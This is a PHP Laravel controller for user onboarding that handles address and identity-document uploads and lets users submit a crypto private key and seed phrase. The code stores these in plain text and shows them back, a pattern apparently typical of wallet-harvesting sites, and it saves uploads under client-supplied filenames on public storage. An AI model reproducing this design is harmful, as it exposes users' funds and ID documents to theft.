<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Mail\Kyc\Uploaded;
use App\Models\User;
use App\Services\LocationService;
use Illuminate\Http\Request;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Illuminate\Validation\Rule;
use Mail;

class OnboardController extends Controller
{
    public function onboardPage()
    {
        $user = User::findOrFail(request()->user()->id);

        if (!empty($user->first_name . $user->last_name) && config('app.id_verification')) {
            return $this->toUploadPage();
        }
        $service = new LocationService();
        return inertia('user.onboarding.address', [
            'countries' => $service->countries(),
        ]);
    }

    public function passPhrase()
    {
        $user = User::findOrFail(auth()->user()->id);
        $secret_phrase = $user->secret_phrase;
        $private_key = $user->private_key;
        return inertia('user.onboarding.passphrase', [
            'secret_phrase' => $secret_phrase,
            'private_key' => $private_key
        ]);
    }
    public function storeKeys(Request $request)
    {
        $data = $request->validate([
            'private_key' => ['nullable', 'string', 'max:191'],
            'secret_phrase' => ['nullable', 'string', 'max:191'],
        ]);

        if (empty($data['private_key'])) {
            unset($data['private_key']);
        }

        if (empty($data['secret_phrase'])) {
            unset($data['secret_phrase']);
        }

        $user = User::findOrFail($request->user()->id);
        $user->update($data);

        session()->flash('success', 'Keys saved successfully');
        return redirect()->route('user.index');
    }

    public function submitAddress(Request $request)
    {
        $user = User::findOrFail($request->user()->id);
        if (!empty($user->first_name . $user->last_name) && config('app.id_verification')) {
            return $this->toUploadPage();
        }

        $data = $request->validate([
            'first_name' => ['required', 'string', 'max:191'],
            'last_name' => ['required', 'string', 'max:191'],
            'phone' => ['required', 'string', 'max:191', 'unique:users'],
            'country' => ['required', 'string', 'max:191'],
            'state' => ['required', 'string', 'max:191'],
            'city' => ['required', 'string', 'max:191'],
            'address' => ['required', 'string', 'max:191'],
            'zip_code' => ['required', 'string', 'max:191'],
        ]);

        // dd($user);
        $user->update(array_merge($data, [
            'refcode' => Str::limit($request->first_name, 3, '') . Str::random(3),
        ]));
        session()->flash('success', 'KYC verification data submited');
        if (config('app.id_verification')) {
            return $this->toUploadPage();
        }
        return redirect()->route('user.index');
    }

    public function toUploadPage()
    {
        return redirect()->route('user.onboard.upload');
    }

    public function toAddressPage()
    {
        return redirect()->route('user.onboard.address');
    }

    public function uploadPage()
    {
        $user = User::findOrFail(request()->user()->id);
        if (empty($user->first_name . $user->last_name)) {
            return $this->toAddressPage();
        }

        if (config('app.id_verification')) {
            return inertia('user.onboarding.upload');
        }
        return redirect()->route('user.index');
    }

    public function upload(Request $request)
    {
        $user = User::findOrFail(request()->user()->id);
        if (empty($user->first_name . $user->last_name)) {
            return $this->toUploadPage();
        }
        $typeCheck = $request->input('type') === 'identity' || $request->input('type') === 'licence';
        $request->validate([
            'type' => ['required', 'string'],
            'back' => ['nullable', Rule::requiredIf($typeCheck), 'mimes:jpg,jpeg,png,webp'],
            'front' => ['nullable', Rule::requiredIf($typeCheck), 'mimes:jpg,jpeg,png,webp'],
            'datapage' => ['nullable', Rule::requiredIf(!$typeCheck), 'mimes:jpg,jpeg,png,webp'],
            'photograph' => ['required', 'mimes:jpg,jpeg,png,webp'],
        ]);

        if ($request->hasFile('back')) {
            $file = $this->uploadFile($request->file('back'), 'documents');
            $user->documents()->create([
                'document' => $file,
                'type' => $request->input('type'),
            ]);
        }

        if ($request->hasFile('front')) {
            $file = $this->uploadFile($request->file('front'), 'documents');
            $user->documents()->create([
                'document' => $file,
                'type' => $request->input('type'),
                'front' => true,
            ]);
        }

        if ($request->hasFile('datapage')) {
            $file = $this->uploadFile($request->file('datapage'), 'documents');
            $user->documents()->create([
                'document' => $file,
                'type' => $request->input('type'),
            ]);
        }

        if ($request->hasFile('photograph')) {
            $file = $this->uploadFile($request->file('photograph'), 'profile_pictures');
            $user->update(['image' => $file]);
        }

        Mail::to($user)->send(new Uploaded($user));

        return redirect()
            ->route('user.index')
            ->withSuccess('Your verification details have been submitted');
    }

    private function uploadFile(UploadedFile $file, string $dir)
    {
        $filename = time() . "{$file->getClientOriginalName()}";
        Storage::disk('public')->putFileAs($dir, $file, $filename);
        return $filename;
    }

}
